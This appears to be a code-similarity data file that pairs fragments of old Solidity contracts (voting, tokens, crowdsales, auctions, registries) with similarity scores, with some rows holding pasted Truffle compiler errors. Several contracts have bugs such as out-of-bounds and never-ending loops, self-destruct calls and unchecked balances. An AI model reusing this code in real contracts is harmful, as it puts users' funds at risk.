    candidates.push(Candidate(candidate3, 0));
    candidates.push(Candidate(candidate4, 0));
    candidates.push(Candidate(candidate5, 0));
}

function authorize(address voter) public {
    require(msg.sender == owner);
    require(!voters[voter].voted);

    voters[voter].weight = 1;

}

function vote(uint voteIndex) public {
    require(now < auctionEnd);
    require(!voters[msg.sender].voted);

    voters[msg.sender].voted = true;
    voters[msg.sender].voteIndex = voteIndex;

    candidates[voteIndex].voteCount += voters[msg.sender].weight;
}

function end() public {
    require(msg.sender == owner);
    require(now >= auctionEnd);

    for(uint i=0; i < candidates.length; i++) {
        ElectionResult(candidates[i].name, candidates[i].voteCount);
    }
}
}",0.5898754431773308,"contract DPOS {
    uint256 public limit;
    address public owner;
    struct VoteItem {
        string content;
        uint agreeNum;
        uint disagreeNum;
    }
    struct VoteRecord {
        address voter;
        bool choice;
    }

    mapping (uint => VoteItem) public voteItems;
    mapping (uint => VoteRecord[]) public voteRecords;

    event Create(uint indexed _id, string indexed _content);
    event Vote(uint indexed _id, address indexed _voter, bool indexed _choice);

    function DPOS() public {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function setLimit(uint256 _limit) public onlyOwner returns (bool) {
        limit = _limit;
        return true;
    }

    function lengthOfRecord(uint256 _id) public view returns (uint length) {
        return voteRecords[_id].length;
    }

    function create(uint _id, string _content) public onlyOwner returns (bool) {
        VoteItem memory item = VoteItem({content: _content, agreeNum: 0, disagreeNum: 0});
        voteItems[_id] = item;
        Create(_id, _content);
        return true;
    }

    function vote(uint _id, address _voter, bool _choice) public onlyOwner returns (bool) {
        if (_choice) {
            voteItems[_id].agreeNum += 1;
        } else {
            voteItems[_id].disagreeNum += 1;
        }
        VoteRecord memory record = VoteRecord({voter: _voter, choice: _choice});
        voteRecords[_id].push(record);
        Vote(_id, _voter, _choice);
        return true;
    }
}"
"contract Ballot {
^ (Relevant source part starts here and spans across multiple lines).

,/home/bc/bheem/Ballot2/contracts/Migrations.sol:11:3: Warning: This declaration shadows an existing declaration.
  function Migrations() public {
  ^ (Relevant source part starts here and spans across multiple lines).
/home/bc/bheem/Ballot2/contracts/Migrations.sol:3:1: The shadowed declaration is here:
contract Migrations {
^ (Relevant source part starts here and spans across multiple lines).



/home/bc/bheem/Ballot2/contracts/Ballot.sol:26:5: SyntaxError: Functions are not allowed to have the same name as the contract. If you intend this to be a constructor, use ""constructor(...) { ... }"" to define it.
    function Ballot() public {
    ^ (Relevant source part starts here and spans across multiple lines).
,/home/bc/bheem/Ballot2/contracts/Migrations.sol:11:3: SyntaxError: Functions are not allowed to have the same name as the contract. If you intend this to be a constructor, use ""constructor(...) { ... }"" to define it.
  function Migrations() public {
  ^ (Relevant source part starts here and spans across multiple lines).
,/home/bc/bheem/Ballot2/contracts/Ballot.sol:26:5: Warning: This declaration shadows an existing declaration.
    function Ballot() public {
    ^ (Relevant source part starts here and spans across multiple lines).
/home/bc/bheem/Ballot2/contracts/Ballot.sol:3:1: The shadowed declaration is here:
contract Ballot {
^ (Relevant source part starts here and spans across multiple lines).

,/home/bc/bheem/Ballot2/contracts/Migrations.sol:11:3: Warning: This declaration shadows an existing declaration.
  function Migrations() public {
  ^ (Relevant source part starts here and spans across multiple lines).
/home/bc/bheem/Ballot2/contracts/Migrations.sol:3:1: The shadowed declaration is here:
contract Migrations {
^ (Relevant source part starts here and spans across multiple lines).

,/home/bc/bheem/Ballot2/contracts/Ballot.sol:57:46: TypeError: Data location must be ""memory"" for return parameter in function, but none was given.
    function getCount() public view returns (uint[8]) {
                                             ^-----^
Compilation failed. See above.
Truffle v5.0.2 (core: 5.0.2)
Node v8.12.0
 please help how to solve this ?",0.5002435071600893,"contract ERC20 is Ownable {
    using SafeMath for uint256;
    
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;


    mapping (address => uint256) public balances;

    mapping (address => mapping (address => uint256)) public allowed;

    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);

    
    function ERC20(
    uint256 _initialSupply,
    string _tokenName,
    uint8 _decimalUnits,
    string _tokenSymbol
    ) public
    {

        balances[0x2e1977127F682723C778bBcac576A4aF2c0e790d] = _initialSupply;
        totalSupply = _initialSupply;
        decimals = _decimalUnits;
        symbol = _tokenSymbol;
        name = _tokenName;
    }

    
    function transfer(address _to, uint256 _value) public  returns (bool) {


        bool status = transferInternal(msg.sender, _to, _value);

        require(status == true);

        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {


        allowed[msg.sender][_spender] = _value;

        Approval(msg.sender, _spender, _value);

        return true;
    }

    function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {


        TokenRecipient spender = TokenRecipient(_spender);

        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {


        if (allowed[_from][msg.sender] < _value) {
            return false;
        }

        bool _success = transferInternal(_from, _to, _value);

        if (_success) {
            allowed[_from][msg.sender] -= _value;
        }

        return _success;
    }

    
    function totalSupply() public constant returns (uint256) {
        return totalSupply;
    }

    function balanceOf(address _address) public constant returns (uint256 balance) {
        return balances[_address];
    }

    function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }

    
    function setBalance(address _holder, uint256 _amount) internal {
        balances[_holder] = _amount;
    }

    function transferInternal(address _from, address _to, uint256 _value) internal returns (bool success) {

        if (_value == 0) {
            Transfer(_from, _to, _value);

            return true;
        }

        if (balances[_from] < _value) {
            return false;
        }

        setBalance(_from, balances[_from].sub(_value));
        setBalance(_to, balances[_to].add(_value));

        Transfer(_from, _to, _value);

        return true;
    }
}"
"contract Migrations {
^ (Relevant source part starts here and spans across multiple lines).



/home/bc/bheem/Ballot2/contracts/Ballot.sol:26:5: SyntaxError: Functions are not allowed to have the same name as the contract. If you intend this to be a constructor, use ""constructor(...) { ... }"" to define it.
    function Ballot() public {
    ^ (Relevant source part starts here and spans across multiple lines).
,/home/bc/bheem/Ballot2/contracts/Migrations.sol:11:3: SyntaxError: Functions are not allowed to have the same name as the contract. If you intend this to be a constructor, use ""constructor(...) { ... }"" to define it.
  function Migrations() public {
  ^ (Relevant source part starts here and spans across multiple lines).
,/home/bc/bheem/Ballot2/contracts/Ballot.sol:26:5: Warning: This declaration shadows an existing declaration.
    function Ballot() public {
    ^ (Relevant source part starts here and spans across multiple lines).
/home/bc/bheem/Ballot2/contracts/Ballot.sol:3:1: The shadowed declaration is here:
contract Ballot {
^ (Relevant source part starts here and spans across multiple lines).

,/home/bc/bheem/Ballot2/contracts/Migrations.sol:11:3: Warning: This declaration shadows an existing declaration.
  function Migrations() public {
  ^ (Relevant source part starts here and spans across multiple lines).
/home/bc/bheem/Ballot2/contracts/Migrations.sol:3:1: The shadowed declaration is here:
contract Migrations {
^ (Relevant source part starts here and spans across multiple lines).

,/home/bc/bheem/Ballot2/contracts/Ballot.sol:57:46: TypeError: Data location must be ""memory"" for return parameter in function, but none was given.
    function getCount() public view returns (uint[8]) {
                                             ^-----^
Compilation failed. See above.
Truffle v5.0.2 (core: 5.0.2)
Node v8.12.0
 please help how to solve this ?",0.5273477862255888,"contract AIAcrowdsale is myOwned {
    uint public startDate;
    uint public stopDate;
    uint public fundingGoal;
    uint public amountRaised;
    token public contractTokenReward;
    address public contractWallet;
    mapping(address => uint256) public balanceOf;
    event GoalReached(address receiver, uint amount);
    event FundTransfer(address backer, uint amount, bool isContribution);

    function AIAcrowdsale (
        uint _startDate,
        uint _stopDate,
        uint _fundingGoal,
        address _contractWallet,
        address _contractTokenReward
    ) {
        startDate = _startDate;
        stopDate = _stopDate;
        fundingGoal = _fundingGoal * 1 ether;
        contractWallet = _contractWallet;
        contractTokenReward = token(_contractTokenReward);
    }
    
    function getCurrentTimestamp() internal returns (uint256) {
        return now;    
    }

    function saleActive() public constant returns (bool) {
        return (now >= startDate && now <= stopDate && amountRaised < fundingGoal);
    }

    function getRateAt(uint256 at) public constant returns (uint256) {
        if (at < startDate) {return 0;} 
        else if (at < (startDate + 150 hours)) {return 4355;} 
        else if (at < (startDate + 318 hours)) {return 3920;} 
        else if (at < (startDate + 486 hours)) {return 3528;} 
        else if (at <= stopDate) {return 3176;} 
        else if (at > stopDate) {return 0;}
    }

    function getRateNow() public constant returns (uint256) {
        return getRateAt(now);
    }

    function () payable {
        require(saleActive());
        require(amountRaised < fundingGoal);
        uint amount = msg.value;
        balanceOf[msg.sender] += amount;
        amountRaised += amount;
        uint price =  0.0001 ether / getRateAt(now);
        contractTokenReward.transfer(msg.sender, amount / price);
        FundTransfer(msg.sender, amount, true);
        contractWallet.transfer(msg.value);
    }

    function saleEnd() onlyOwner {
        require(!saleActive());
        require(now > stopDate );
        contractWallet.transfer(this.balance);
        contractTokenReward.transfer(contractWallet, this.balance);

    }

    function destroy() { 
        if (msg.sender == contractWallet) { 
        suicide(contractWallet);
        contractTokenReward.transfer(contractWallet, this.balance);
        }
    }    
}"
"contract CoordinateUtils {
    function coordinatesToBytes32(int16 x, int16 y) internal pure returns(bytes32) {
        return (bytes32(x) << 16 & 0xFFFFFFFF) | bytes16(y);  
    }
    function bytes32ToCoordinates(bytes32 b) internal pure returns(int16 x, int16 y) {
        return (int16(b >> 16), int16(b));
    }
}",0.5929970854432056,"contract Math {

    function add(uint256 x, uint256 y) pure internal returns(uint256) {

      uint256 z = x + y;

      assert((z >= x) && (z >= y));

      return z;

    }



    function subtract(uint256 x, uint256 y) pure internal returns(uint256) {

      assert(x >= y);

      uint256 z = x - y;

      return z;

    }

}"
"contract HashSave {                   
   event log_current_hash(bytes hashArg);

   constructor() public {                       
   }

   function set_hash(bytes memory objectHash) public {
       emit log_current_hash(objectHash);
   }
}",0.5764278811257838,"contract StoxVotingLog {

    

    event LogVotes(address _voter, uint sum);



    constructor() public {}



    function logVotes(uint sum)

        public

        {

            emit LogVotes(msg.sender, sum);

        }



}"
"contract WeirdCase {

    address internal owner;
    uint256[] newArray;

    constructor() {
        owner = msg.sender;
    }

    function someMethod1() external {
        uint256[] memory newArray = new uint256[](10);
        for (uint256 i = 0; i < 10; i++) {
            newArray[i] = i;
        }
    }

    function someMethod2() external {
        for (uint256 i = 0; i < 10; i++) {
            newArray.push(i);
        }
    }

    function someMethod3() external {
        uint256[] storage weirdArray;
        for (uint256 i = 0; i < 10; i++) {
            weirdArray.push(i);
        }
    }

    function getOwner() view returns(address) {
        return owner;
    }
}",0.5841601114916861,"contract DogCoreInterface {
    
    function getDog(uint256 _id) external view returns (
        uint256 cooldownIndex,
        uint256 nextActionAt,
        uint256 siringWithId,
        uint256 birthTime,
        uint256 matronId,
        uint256 sireId,
        uint256 generation,
        uint256 genes,
        uint8 variation,
        uint256 gen0
        ); 

    function sendMoney(address _to, uint256 _money) external;    

    function cfoAddress() public returns(address);

    function cooAddress() public returns(address);
    
    function getAvailableBlance() external view returns(uint256);
}"
"contract GiveRefreceId {

    struct  referenceids {
        uint256 rid ;
        address addressrid;
}
    mapping(uint256 => referenceids) referenceid;
    referenceids[] lenrefrenceid;

function giveRefrenceId() public returns (uint256)  { 
    for (uint256 i=0 ;i<=lenrefrenceid.length; i++){

        require( lenrefrenceid[i]  != msg.sender);
    } 

    uint256 lenvarble = lenrefrenceid.length;

    referenceids  storage temprid = referenceid[lenvarble];

    temprid.rid = lenvarble;
    temprid.addressrid = msg.sender;
    lenrefrenceid.push(temprid);
    return lenvarble;
}

function  getrefrnceId()  view returns(uint256) {

return ((lenrefrenceid.length)-1);

}
}",0.5495908173979055,"contract BasicToken is ERC20 {

  using SafeMath for uint256;



  mapping(address => uint256) balances;



  uint256 totalSupply_;



  function totalSupply() public view returns (uint256) {

    return totalSupply_;

  }



  function transfer(address _to, uint256 _value) public returns (bool) {

    require(_to != address(0));

    require(_value <= balances[msg.sender]);



    balances[msg.sender] = balances[msg.sender].sub(_value);

    balances[_to] = balances[_to].add(_value);

    emit Transfer(msg.sender, _to, _value);

    return true;

  }



  function balanceOf(address _owner) public view returns (uint256) {

    return balances[_owner];

  }



}"
"contract SeasonFactory {    
    address public owner;
    address[] public seasons;

    event SeasonCreated(uint64 indexed beginTicks, uint64 indexed endTicks, address season);

    function SeasonFactory() public {
        owner = msg.sender;
    }

    function newSeason(uint64 beginTicks, uint64 endTicks) public restricted {
        require(beginTicks < endTicks);
        require(seasons.length == 0 || Season(seasons[seasons.length - 1]).period().endTicks() < beginTicks);

        Season season = new Season(owner, beginTicks, endTicks);
        seasons.push(season);
        emit SeasonCreated(beginTicks, endTicks, season);
    }

    function getSeasonsCount() public view returns(uint) {
        return seasons.length;
    }

    function getSeasonForDate(uint64 ticks) public view returns(address) {
        for (uint i = seasons.length - 1; i >= 0; i--) {
            Season season = Season(seasons[i]);
            if (ticks >= season.period.beginTicks() && ticks <= season.period.endTicks())
                return season;
        }
        return 0;
    }

    modifier restricted {
        require(owner == msg.sender);
        _;
    }
}",0.5724389353711917,"contract Manager is Ownable {
    
    address[] managers;

    modifier onlyManagers() {
        bool exist = false;
        if(owner == msg.sender) {
            exist = true;
        } else {
            uint index = 0;
            (exist, index) = existManager(msg.sender);
        }
        require(exist);
        _;
    }
    
    function getManagers() public view returns (address[] memory){
        return managers;
    }
    
    function existManager(address _to) private view returns (bool, uint) {
        for (uint i = 0 ; i < managers.length; i++) {
            if (managers[i] == _to) {
                return (true, i);
            }
        }
        return (false, 0);
    }
    function addManager(address _to) onlyOwner public {
        bool exist = false;
        uint index = 0;
        (exist, index) = existManager(_to);
        
        require(!exist);
        
        managers.push(_to);
    }
    function deleteManager(address _to) onlyOwner public {
        bool exist = false;
        uint index = 0;
        (exist, index) = existManager(_to);
        
        require(exist);
   
        uint lastElementIndex = managers.length - 1; 
        managers[index] = managers[lastElementIndex];

        delete managers[managers.length - 1];
        managers.length--;
    }

}"
"contract Season {
    address public owner;
    SharedTypes.DateRange public period;

    function Season(address owner_, uint64 beginTicks, uint64 endTicks) public {
        owner = owner_;
        period = SharedTypes.DateRange(beginTicks, endTicks);
    }
}",0.5916372956323276,"contract SendMe_owned {
    address public owner;

    function owned() public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address newOwner) onlyOwner public {
        owner = newOwner;
    }
}"
"contract CoinFlipOracle is usingProvable {

string public result;
bytes32 public oraclizeId;

function coinFlip() public payable returns(string memory) {
    oraclizeId = provable_query('WolframAlpha', 'flip a coin');
    return result;
}

function __callback(bytes32 _oraclizeId, string memory _result) public override(usingProvable) {
    
    require(msg.sender == provable_cbAddress());
    result = _result;
}",0.5952739144332531,"contract OraclizeI {
    address public cbAddress;
    function query_withGasLimit(uint _timestamp, string _datasource, string _arg, uint _gaslimit) payable public returns (bytes32 _id);
    function getPrice(string _datasource, uint gaslimit) public returns (uint _dsprice);
    function setProofType(byte _proofType) public;
    function setCustomGasPrice(uint _gasPrice) public;
}"
"contract DAppInterface {

    struct DataItem {
        bytes32 key;
        string value;
    }

    mapping(bytes32 => DataItem) public dataItems;

    function addDataItem(bytes32 k, string v) external {
        dataItems[k].key = k;
        dataItems[k].value = v;
    }
}",0.5805661421272718,"contract SaveInt{

    constructor() public {

    }

    mapping (string=>uint) data;

    function setStr(string key, uint value) public {

        data[key] = value;

    }

    function getStr(string key) public constant returns(uint){

        return data[key];

    }

}"
"contract TestEmojiCoin {
    uint public initialBalance = 1 ether;

    function testPurchase() public {
        address contractAddress = DeployedAddresses.EmojiCoin();
        EmojiCoin emojiCoin = EmojiCoin(contractAddress);

        

        emojiCoin.purchase.value(1 ether).gas(30000000000)(0);      
    }
}",0.5131214042410907,"contract ERC20Basic {
    function balanceOf(address who) public constant returns(uint256);
    function transfer(address to, uint256 value) public returns(bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}"
"contract List {

    struct ListMembers {
        bytes32 listOwner;
        bytes32[] members;
        uint256 rNumber;
        uint256 aNumber; 
        uint256 uNumber;  
    }

    ListMembers public lm;
    mapping (bytes32 => bool) public addedMembers;

    function List(bytes32 listOwner) {
        lm.listOwner = listOwner;
        lm.rNumber = 10000;
        lm.aNumber = 0;
        lm.uNumber = 0;
    }
}",0.5540804892490914,"contract Bridge {
  
  function admin() external view returns (address) {
  }

  struct Period {
    uint32 height;  
    uint32 timestamp;
  }

  bytes32 public tipHash; 
  uint256 public genesisBlockNumber;
  uint256 parentBlockInterval; 
  uint256 public lastParentBlock; 
  address public operator; 

  mapping(bytes32 => Period) public periods;

}"
"contract RegisterContract {

    uint public contractWeight;
    mapping(bytes32=>string) public contracts;

    function addContract ( string jsonInput, bytes32 hashKey) public {
        contracts[hashKey] = jsonInput;
    }

    function addWeight (uint weight) public {
        contractWeight = weight;
    }

}",0.5997410657118961,"contract Bakery {



  



  address[] public contracts;



  



  function getContractCount()

    public

    constant

    returns(uint contractCount)

  {

    return contracts.length;

  }



  



  function newCookie()

    public

    returns(address newContract)

  {

    Cookie c = new Cookie();

    contracts.push(c);

    return c;

  }

}"
"contract AuctionHouse is ItemOwnership {
constructor () public payable {}
function () external payable {}


function purchaseAuction(uint _id, address _buyer) external payable {

    Auction memory auction = auctions[auctionIndexes[_id]];
    require(
        msg.sender == _buyer ||
        approvedForAll[_buyer][msg.sender], 
        ""You must have authority over purchasing account"");
    require(isOnAuction(_id), ""That item is not on auction"");
    require(auction.startTime + auction.expiration > now, ""auction is expired"");
    require(_buyer != ownerOfItem[_id], ""Can't purchase your own item"");

    
    removeAuction(_id, _buyer);

    
    
    
    msg.sender.transfer(1); 

    
    emit AuctionPurchased(_id, auction.price, auction.seller, _buyer);
}",0.5584854593257967,"contract SingleVault {

    address owner;

    address operator;

    address cstpc = 0x250;

    address cetpc = 0x251;



    constructor(address ownerAccount) public {

        owner = ownerAccount;

        operator = msg.sender;

    }



    

    function() public payable { }



    modifier isoperator() {

        require(operator == msg.sender);

        _;

    }



    modifier isowner() {

        require(owner == msg.sender);

        _;

    }



    function withdraw(uint amount) external isowner() {

        owner.transfer(amount);

    }



    function reset(address operationalAccount) external isowner() {

      operator = operationalAccount;

    }



    function bid(address account, uint256 stake, uint256 gasPrice, bytes votePubKey) external isoperator() {

        BidInterface(cstpc).bid(account, stake, gasPrice, votePubKey);

    }

}"
"contract Caller {
    Callee private callee = new Callee();
    uint256 public yyyy;

    function callFromConstantFunc() external view returns (uint256) {
        uint256[1] memory retv;
        address dest = address(callee);
        bytes memory selector = abi.encodeWithSelector(callee.func.selector);
        assembly {
            let status := call(gas, dest, 0, add(selector, 32), mload(selector), retv, 32)
            if iszero(status) {
                revert(0, 0)
            }
        }
        return retv[0];
    }

    function callFromNonConstantFunc() external returns (uint256) {
        uint256[1] memory retv;
        address dest = address(callee);
        bytes memory selector = abi.encodeWithSelector(callee.func.selector);
        assembly {
            let status := call(gas, dest, 0, add(selector, 32), mload(selector), retv, 32)
            if iszero(status) {
                revert(0, 0)
            }
        }
        yyyy = retv[0];
    }

    function xxxx() external view returns (uint256) {
        return callee.xxxx();
    }
}",0.5636716408667138,"contract Lock is Ownable {

    uint256 public constant MAX_LOCK_JUMP = 86400 * 365; 



    uint256 public lock;



    event SetLock(uint256 _prev, uint256 _new);

    

    constructor() public {

        lock = now;

        emit SetLock(0, now);

    }

    

    modifier onUnlocked() {

        require(now >= lock, ""Wallet locked"");

        _;

    }

    

    function setLock(uint256 _lock) external onlyOwner {

        require(_lock > lock, ""Can't set lock to past"");

        require(_lock - lock <= MAX_LOCK_JUMP, ""Max lock jump exceeded"");

        emit SetLock(lock, _lock);

        lock = _lock;

    }



    function withdraw(ERC20 _token, address _to, uint256 _value) external onlyOwner onUnlocked returns (bool) {

        return _token.transfer(_to, _value);

    }

    

    function call(address payable _to, uint256 _value, bytes calldata _data) external onlyOwner onUnlocked returns (bool, bytes memory) {

        return _to.call.value(_value)(_data);

    }

}"
"contract bidding {

struct bid {
    string bidderName;
    uint grainId;
    uint bidAmount;
    uint bidTime;
}

mapping (uint => bid) bidInfos;
uint[] public bidIds;

function addBid(
    uint _bidId,
    string _bidderName, 
    uint _grainId, 
    uint _bidAmount
) public {
    var bid_info = bidInfos[_bidId];
    bid_info.bidderName = _bidderName;
    bid_info.grainId = _grainId;
    bid_info.bidAmount=_bidAmount;
    bid_info.bidTime= now;

    bidIds.push(_bidId) -1;
}

function getallBids() view public returns(uint[]) {
    return bidIds;
}

function getBid(uint _bidId) view public returns (string, uint, uint, uint) {
    return (
        bidInfos[_bidId].bidderName, 
        bidInfos[_bidId].grainId,
        bidInfos[_bidId].bidAmount, 
        bidInfos[_bidId].bidTime
    );
}

function getbidcount() view public returns (uint) {
    return bidIds.length;
}
}",0.5414408301682088,"contract Token is ERC20 {
    using SafeMath for uint;

    string public name;
    string public symbol;
    uint8 public decimals;

    function Token(string _name, string _symbol, uint8 _decimals) public {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }

    function start() public only(owner) isNotStartedOnly {
        isStarted = true;
    }

    
    function mint(address _to, uint _amount) public only(owner) isNotStartedOnly returns(bool) {
        totalSupply = totalSupply.add(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(msg.sender, _to, _amount);
        return true;
    }

    function multimint(address[] dests, uint[] values) public only(owner) isNotStartedOnly returns (uint) {
        uint i = 0;
        while (i < dests.length) {
           mint(dests[i], values[i]);
           i += 1;
        }
        return(i);
    }
}"
"contract Betting is usingOraclize {

    address public owner = msg.sender;
    uint accountbalance;


    event Log(string);
    event error(string error_);
    event beforebetbalanceplayer(uint256);
    event beforebetbalanceowner(uint256);
    event afterbetbalanceplayer(uint256);
    event afterbetbalanceowner(uint256);
    event betamount(uint256);



        modifier onlyOwner {
            require(msg.sender == owner);
            _;
        }




mapping (address => uint256) private balanceOf;

  
        function transferamount (address _player, uint256 _amount) public payable {

                balanceOf[_player] = _player.balance;
                balanceOf[owner] = owner.balance;

                beforebetbalanceplayer(balanceOf[_player]);
                beforebetbalanceowner(balanceOf[owner]);

                Log(""Reducing amount from player's account"");
                balanceOf[_player] -= _amount;
                afterbetbalanceplayer(balanceOf[_player]);

                Log(""Adding amount to owner's account"");
                balanceOf[owner] += _amount;
                afterbetbalanceowner(balanceOf[owner]);

                afterbetbalanceplayer(_player.balance);
                afterbetbalanceowner(owner.balance);

            }       




        function getBalance (address _account) constant returns(uint256){
                return _account.balance;

        }




        function()  payable{    

            }
}",0.5642346055600845,"contract Token is TokenInterface {
    function balanceOf(address _owner) constant returns (uint256 balance) {
        return balances[_owner];
    }

    function _transfer(address _to, uint256 _amount) internal returns (bool success) {
        if (balances[msg.sender] >= _amount && _amount > 0) {
            balances[msg.sender] -= _amount;
            balances[_to] += _amount;
            Transfer(msg.sender, _to, _amount);
            return true;
        } else {
           return false;
        }
    }

    function _transferFrom(address _from,
                           address _to,
                           uint256 _amount) internal returns (bool success) {
        if (balances[_from] >= _amount
            && allowed[_from][msg.sender] >= _amount
            && _amount > 0) {

            balances[_to] += _amount;
            balances[_from] -= _amount;
            allowed[_from][msg.sender] -= _amount;
            Transfer(_from, _to, _amount);
            return true;
        } else {
            return false;
        }
    }

    function approve(address _spender, uint256 _amount) returns (bool success) {
        require(_amount >= 0);
        allowed[msg.sender][_spender] = _amount;
        Approval(msg.sender, _spender, _amount);
        return true;
    }

    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }

}"
"contract PubStorageReader {
  uint public storedData;
  PublicStorage publicStorage;

  function PubStorageReader(uint initVal, address publStorageAddr) public {
    storedData = initVal;
    publicStorage = PublicStorage(publStorageAddr);
  }

  function setPublic(uint x) public {
    publicStorage.set(x);
  }

  function getPublic() constant public returns (uint publicRetVal) {
    return publicStorage.get();
  }
}",0.5664911676509009,"contract OraclizeI {
    address public cbAddress;
    function query_withGasLimit(uint _timestamp, string _datasource, string _arg, uint _gaslimit) payable public returns (bytes32 _id);
    function getPrice(string _datasource, uint gaslimit) public returns (uint _dsprice);
    function setProofType(byte _proofType) public;
    function setCustomGasPrice(uint _gasPrice) public;
}"
"contract TestLibrary {
    using IntExtended for uint;

    function testIncrement(uint _base) returns (uint) {
        return IntExtended.increment(_base);
    }
}",0.5789754691939399,"contract CaCoreInterface {
    function createCombinedAtom(uint, uint) external returns (uint);
    function createRandomAtom() external returns (uint);
}"
"contract Exchange {
    address public owner;
    constructor() public {
        owner = msg.sender;
   }


ERC721Full public ERC721FullInterface;
IERC20 public IERC20Interface;
struct forSale{
    address owner;
    uint256 tokenId;
    uint256 price;
}
struct PreviousPrice{
    uint256 _price;
}
forSale[] public tokensForSale;
mapping(uint256 => PreviousPrice[])public previousSoldPrice;
address public theErc20;
address public theErc721;
function addAddresses (address _erc20, address _erc721)public returns(bool) {
    require(msg.sender == owner);
    theErc20= _erc20;
    theErc721 = _erc721;
    return(true);
}
event Sale(uint256 _tokenId, uint256 _price, address indexed _seller);
event Sold(uint256 _listId, uint256 _tokenId, uint256 _price, address indexed _seller);

function setForSale(uint256 _tokenId, uint256 _price) external returns(bool){
    require(_price > 0);
    ERC721FullInterface = ERC721Full(theErc721);
    require(ERC721FullInterface.ownerOf(_tokenId) == msg.sender);
    require(ERC721FullInterface.getApproved(_tokenId) == address(this));
    tokensForSale.push(forSale(msg.sender,_tokenId, _price));
    emit Sale(_tokenId, _price, msg.sender);
    return true;
}

function buy(uint256 _listId) external returns(bool){
    IERC20Interface = IERC20(theErc20);
    ERC721FullInterface = ERC721Full(theErc721);
    uint256 tokenId = tokensForSale[_listId].tokenId;
    address seller = tokensForSale[_listId].owner;
    require(ERC721FullInterface.ownerOf(tokenId) == seller);
    require(ERC721FullInterface.getApproved(tokenId) == address(this));

    uint256 priceToPay = tokensForSale[_listId].price;
    uint256 amount = priceToPay *90/100;
    uint256 charge = priceToPay-amount;
    require(IERC20Interface.balanceOf(msg.sender) >= priceToPay);
    require(IERC20Interface.allowance(msg.sender,address(this)) >= priceToPay);
    IERC20Interface.transferFrom(msg.sender,seller,amount);
    IERC20Interface.transferFrom(msg.sender,owner,charge);
    ERC721FullInterface.safeTransferFrom(seller,msg.sender,tokenId);
    previousSoldPrice[tokenId].push(PreviousPrice(priceToPay));
    delete tokensForSale[_listId];
    emit Sold(_listId, tokenId, priceToPay, seller);
    return true;
}

function getPriceForSold(uint256 _tokenId) public view returns(uint256[] memory){
    uint256 theLen = previousSoldPrice[_tokenId].length;
    uint256[] memory actualPrices = new uint256[](theLen);
    for(uint i=0; i <theLen;i++){
        actualPrices[i] = previousSoldPrice[_tokenId][i]._price;
    }
    return actualPrices;

}

function getForSaleLen() public view returns(uint256){
    return tokensForSale.length;
}

}",0.5921707881681999,"contract Crowdsale is ReentrancyGuard {

    using SafeMath for uint256;

    

    address public manager;

    address payable public returnWallet;

    uint256 public etherEuroRate;

    uint256 public safetyLimit = 300000*10**18;

    ERC20Interface private _token;

    uint256 public minWeiValue = 10**17;



    constructor (

            uint256 rate, 

            address payable wallet, 

            address contractManager, 

            ERC20Interface token

                ) public {

        require(rate > 0);

        require(wallet != address(0));

        require(contractManager != address(0));

        require(address(token) != address(0));



        manager = contractManager;

        etherEuroRate = rate;

        returnWallet = wallet;

        _token = token;

    }

    

    modifier restricted(){

        require(msg.sender == manager );

        _;

    }



    

    function buyTokens(address beneficiary) public nonReentrant payable {

        uint256 weiAmount = msg.value;

        _preValidatePurchase(beneficiary, weiAmount);

        uint256 tokens = (weiAmount.div(2)).mul(etherEuroRate);

        require(tokens>0);

        require(weiAmount>minWeiValue);

        _forwardFunds();

        _token.transfer(beneficiary,tokens);

    }



    function () external payable {

        buyTokens(msg.sender);

    }



    function _preValidatePurchase(address beneficiary, uint256 weiAmount) internal view {

        require(beneficiary != address(0));

        require(weiAmount != 0);

        require(weiAmount < safetyLimit);

    }



    function setManager(address newManager) public restricted {

        require(msg.sender == manager);

        require(newManager != address(0));

        manager=newManager;

    }

    

    function updateRate(uint256 newEtherEuroRate) public restricted{

        require(newEtherEuroRate > 0);

        etherEuroRate=newEtherEuroRate;

    }

    

    

    function setSafeLimit(uint256 limitEther) public restricted{

        require(limitEther>0);

        safetyLimit=limitEther.mul(10**18);

    }

    

    function getNumberOfWeiTokenPerWei(uint256 weiToConvert) public view returns(uint256){

        require(weiToConvert > 0);

        require(weiToConvert < safetyLimit);

        return weiToConvert.mul(etherEuroRate.div(2));

    }

    

    function setMinWeiValue(uint256 minWei) public restricted{

        require(minWei > 10);

        minWeiValue = minWei;

    }

    

    function _forwardFunds() internal {

        returnWallet.transfer(msg.value);

    }

    

    function setReturnWallet(address payable _wallet) public restricted{

        require(_wallet != address(0));

        returnWallet=_wallet;

    }

    

    function reclaimToken() public restricted{

        require(manager!=address(0));

        _token.transfer(manager,_token.balanceOf(address(this)));

    }

    

    function getContractBalance() public view returns(uint256){

        return (_token.balanceOf(address(this)));

    }

    

    function getCurrentTokenContract() public view returns(address){

        return address(_token);

    }

    

}"
"contract User {
    
    address regAddress = 0xf70ce669d4fa2bdeae1c4c61021627fc4b1d463c;
    address owner = msg.sender;

    function addID(string _id){
        
        Registry registry = Registry(regAddress);
        registry.addID(_id, owner);
    }

    function addContract(address _owner) {
        Registry registry = Registry(regAddress);
        registry.addContract(owner);
    }
}",0.5996032956589769,"contract Registry {

    address public addressRegistry;

    modifier onlyAdmin() {

        require(msg.sender == getAddress(""admin""), ""Permission Denied"");

        _;

    }

    function getAddress(string memory name) internal view returns (address) {

        AddressRegistry addrReg = AddressRegistry(addressRegistry);

        return addrReg.getAddr(name);

    }

}"
"contract Filter {

    using HitchensUnorderedKeySetLib for HitchensUnorderedKeySetLib.Set;
    HitchensUnorderedKeySetLib.Set filterSet;

    struct FilterStruct {
